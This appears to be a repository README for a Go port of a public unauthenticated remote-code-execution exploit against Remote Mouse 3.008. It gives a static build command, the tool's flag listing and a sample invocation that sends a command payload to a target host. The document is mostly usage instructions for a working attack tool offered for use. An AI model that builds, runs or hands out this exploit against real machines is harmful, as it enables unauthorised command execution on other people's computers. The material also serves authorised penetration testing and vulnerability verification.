# Remote Mouse 3.008 - Failure to Authenticate to RCE

Rewrite in Go of the exploit from [0rphon for Remote Mouse 3.008](https://www.exploit-db.com/exploits/46697).
Go allows you to compile a static executable in a simple way with :

```
$ CGO_ENABLED=0 GOOS=linux go build -a -ldflags '-extldflags "-static"' main.go
```

## How to use 

```
$ ./46697 -h
Usage of ./46697:
  -delay int
        delay between each write to the RemoteMouse server in millisecond (default 500)
  -host string
        host of the RemoteMouse server
  -payload string
        payload to the RemoteMouse server
  -port int
        port of RemoteMouse server (default 1978)
  -progress
        show sended packet to the RemoteMouse server

$ ./46697 -host 10.1.1.89 -payload "ping.exe 127.0.0.1" -progress
```
